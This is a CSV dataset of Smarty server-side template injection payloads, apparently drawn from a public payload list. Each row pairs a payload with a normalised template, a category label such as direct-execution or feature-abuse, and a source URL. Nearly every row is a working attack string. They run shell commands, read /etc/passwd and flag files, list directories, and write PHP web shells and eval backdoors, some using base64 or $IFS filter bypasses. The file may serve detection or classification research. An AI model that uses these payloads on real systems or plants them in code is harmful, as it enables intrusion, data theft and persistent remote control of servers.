{php}echo readfile('/etc/passwd');{/php},{php}echoreadfile('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}echo readfile('flag.txt');{/php},{php}echoreadfile('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}print_r(scandir('/'));{/php},{php}print_r(scandir('S'));{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}print_r(scandir('.'));{/php},{php}print_r(scandir('S'));{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}var_dump(scandir('/'));{/php},{php}var_dump(scandir('S'));{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}highlight_file('/etc/passwd');{/php},{php}highlight_file('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}highlight_file('flag.txt');{/php},{php}highlight_file('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}show_source('/etc/passwd');{/php},{php}show_source('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}show_source('flag.txt');{/php},{php}show_source('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}$output=shell_exec('id');echo $output;{/php},{php}$output=shell_exec('S');echo$output;{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}$output=shell_exec('whoami');echo $output;{/php},{php}$output=shell_exec('S');echo$output;{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}$output=shell_exec('cat /etc/passwd');echo $output;{/php},{php}$output=shell_exec('S');echo$output;{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}file_put_contents('shell.php','<?php system($_GET[cmd]); ?>');{/php}","{php}file_put_contents('S','S');{/php}",php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}file_put_contents('info.php','<?php phpinfo(); ?>');{/php}","{php}file_put_contents('S','S');{/php}",php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}file_put_contents('backdoor.php','<?php eval($_POST[cmd]); ?>');{/php}","{php}file_put_contents('S','S');{/php}",php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{system('whoami')},{system('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{system('cat /etc/passwd')},{system('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{system('ls -la')},{system('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{system('uname -a')},{system('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{exec('id')},{exec('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{exec('whoami')},{exec('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{exec('cat /etc/passwd')},{exec('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{passthru('id')},{passthru('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{passthru('whoami')},{passthru('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{passthru('cat /etc/passwd')},{passthru('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{shell_exec('id')},{shell_exec('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{shell_exec('whoami')},{shell_exec('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{shell_exec('cat /etc/passwd')},{shell_exec('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{file_get_contents('/etc/passwd')},{file_get_contents('S')},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{file_get_contents('flag.txt')},{file_get_contents('S')},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{readfile('/etc/passwd')},{readfile('S')},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{readfile('flag.txt')},{readfile('S')},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{phpinfo()},{phpinfo()},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{highlight_file('/etc/passwd')},{highlight_file('S')},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{show_source('/etc/passwd')},{show_source('S')},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{scandir('/')},{scandir('S')},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{scandir('.')},{scandir('S')},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{self::getStreamVariable(""file:/etc/passwd"")}","{self::getstreamvariable(""S"")}",php,Smarty,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{self::getStreamVariable(""file:flag.txt"")}","{self::getstreamvariable(""S"")}",php,Smarty,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,""<?php phpinfo(); ?>"",self::clearConfig())}","{smarty_internal_write_file::writefile($script_name,""S"",self::clearconfig())}",php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,""<?php system($_GET['x']); ?>"",self::clearConfig())}","{smarty_internal_write_file::writefile($script_name,""S"",self::clearconfig())}",php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,""<?php eval($_POST['x']); ?>"",self::clearConfig())}","{smarty_internal_write_file::writefile($script_name,""S"",self::clearconfig())}",php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{function name='x' a='system'}{$a('id')}{/function}{x},{functionname='S'a='S'}{$a('S')}{/function}{x},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{function name='x' a='exec'}{$a('id')}{/function}{x},{functionname='S'a='S'}{$a('S')}{/function}{x},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{function name='x' a='passthru'}{$a('id')}{/function}{x},{functionname='S'a='S'}{$a('S')}{/function}{x},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{function name='x' a='shell_exec'}{$a('id')}{/function}{x},{functionname='S'a='S'}{$a('S')}{/function}{x},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{function name='x'}{php}system('id');{/php}{/function}{x},{functionname='S'}{php}system('S');{/php}{/function}{x},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{function name='x'}{php}phpinfo();{/php}{/function}{x},{functionname='S'}{php}phpinfo();{/php}{/function}{x},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{$smarty.template_object->smarty->display('string:{php}system($_GET[cmd]);{/php}')},{$smarty.template_object->smarty->display('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{math equation='system(""id"")'}",{mathequation='S'},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{math equation='exec(""id"")'}",{mathequation='S'},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{math equation='passthru(""id"")'}",{mathequation='S'},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{math equation='shell_exec(""id"")'}",{mathequation='S'},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='cmd' value='system'},{assignvar='S'value='S'},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='cmd' value='exec'},{assignvar='S'value='S'},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='cmd' value='passthru'},{assignvar='S'value='S'},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='cmd' value='shell_exec'},{assignvar='S'value='S'},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='cmd' value='phpinfo'},{assignvar='S'value='S'},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='a' value='system'}{$a('id')},{assignvar='S'value='S'}{$a('S')},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='a' value='exec'}{$a('whoami')},{assignvar='S'value='S'}{$a('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='a' value='passthru'}{$a('cat /etc/passwd')},{assignvar='S'value='S'}{$a('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='a' value='shell_exec'}{$a('ls -la')},{assignvar='S'value='S'}{$a('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='a' value='file_get_contents'}{$a('/etc/passwd')},{assignvar='S'value='S'}{$a('S')},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='a' value='readfile'}{$a('/etc/passwd')},{assignvar='S'value='S'}{$a('S')},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='a' value='highlight_file'}{$a('/etc/passwd')},{assignvar='S'value='S'}{$a('S')},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='a' value='show_source'}{$a('/etc/passwd')},{assignvar='S'value='S'}{$a('S')},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='a' value='scandir'}{$a('/')},{assignvar='S'value='S'}{$a('S')},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{assign var='a' value='phpinfo'}{$a()},{assignvar='S'value='S'}{$a()},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{capture name='x'}{php}system('id');{/php}{/capture},{capturename='S'}{php}system('S');{/php}{/capture},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{capture name='x'}{php}phpinfo();{/php}{/capture},{capturename='S'}{php}phpinfo();{/php}{/capture},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{capture name='x'}{php}eval($_GET['cmd']);{/php}{/capture},{capturename='S'}{php}eval($_get['S']);{/php}{/capture},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{literal}{php}system('id');{/php}{/literal},{literal}{php}system('S');{/php}{/literal},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{literal}{php}phpinfo();{/php}{/literal},{literal}{php}phpinfo();{/php}{/literal},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{if system('id')}{/if},{ifsystem('S')}{/if},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{if exec('id')}{/if},{ifexec('S')}{/if},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{if passthru('id')}{/if},{ifpassthru('S')}{/if},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{if shell_exec('id')}{/if},{ifshell_exec('S')}{/if},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{if phpinfo()}{/if},{ifphpinfo()}{/if},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{foreach from=system('id') item=i}{/foreach},{foreachfrom=system('S')item=i}{/foreach},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{foreach from=exec('id') item=i}{/foreach},{foreachfrom=exec('S')item=i}{/foreach},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{section name=x loop=system('id')}{/section},{sectionname=xloop=system('S')}{/section},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{section name=x loop=exec('id')}{/section},{sectionname=xloop=exec('S')}{/section},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('cat${IFS}/etc/passwd');{/php},{php}system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('cat$IFS/etc/passwd');{/php},{php}system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('cat</etc/passwd');{/php},{php}system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('cat<flag.txt');{/php},{php}system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{system('cat${IFS}/etc/passwd')},{system('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{system('cat$IFS/etc/passwd')},{system('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{exec('cat</etc/passwd')},{exec('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{passthru('cat<flag.txt')},{passthru('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('calc');{/php},{php}system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('cmd /c calc');{/php},{php}system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('cmd /c dir');{/php},{php}system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('powershell.exe');{/php},{php}system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('cmd.exe /c whoami');{/php},{php}system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{system('calc')},{system('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{system('cmd /c calc')},{system('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{system('cmd /c dir')},{system('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{system('cmd /c whoami')},{system('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{exec('cmd /c whoami')},{exec('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{passthru('cmd /c whoami')},{passthru('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{shell_exec('cmd /c whoami')},{shell_exec('S')},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}popen('id','r');{/php}","{php}popen('S','S');{/php}",php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}proc_open('id',array(),$pipes);{/php}","{php}proc_open('S',array(),$pipes);{/php}",php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}pcntl_exec('/bin/sh',array('-c','id'));{/php}","{php}pcntl_exec('S',array('S','S'));{/php}",php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}assert('system(""id"")');{/php}",{php}assert('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}assert('phpinfo()');{/php},{php}assert('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}create_function('','system(""id"");');{/php}","{php}create_function('S','S');{/php}",php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}call_user_func('system','id');{/php}","{php}call_user_func('S','S');{/php}",php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}call_user_func('exec','id');{/php}","{php}call_user_func('S','S');{/php}",php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}call_user_func('passthru','id');{/php}","{php}call_user_func('S','S');{/php}",php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}call_user_func('shell_exec','id');{/php}","{php}call_user_func('S','S');{/php}",php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}call_user_func('phpinfo');{/php},{php}call_user_func('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}call_user_func_array('system',array('id'));{/php}","{php}call_user_func_array('S',array('S'));{/php}",php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}array_map('system',array('id'));{/php}","{php}array_map('S',array('S'));{/php}",php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}array_filter(array('id'),'system');{/php}","{php}array_filter(array('S'),'S');{/php}",php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}uasort(array('id'=>0),'system');{/php}","{php}uasort(array('S'=>N),'S');{/php}",php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}uksort(array('id'=>0),'system');{/php}","{php}uksort(array('S'=>N),'S');{/php}",php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}usort(array('id'),'system');{/php}","{php}usort(array('S'),'S');{/php}",php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{include file='/etc/passwd'},{includefile='S'},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{include file='flag.txt'},{includefile='S'},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{include file='php://filter/convert.base64-encode/resource=/etc/passwd'},{includefile='S'},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{include file='php://filter/convert.base64-encode/resource=flag.txt'},{includefile='S'},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{include file='php://input'},{includefile='S'},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{include file='data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg=='}",{includefile='S'},php,Smarty,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{include file='data://text/plain,<?php system($_GET[cmd]); ?>'}",{includefile='S'},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
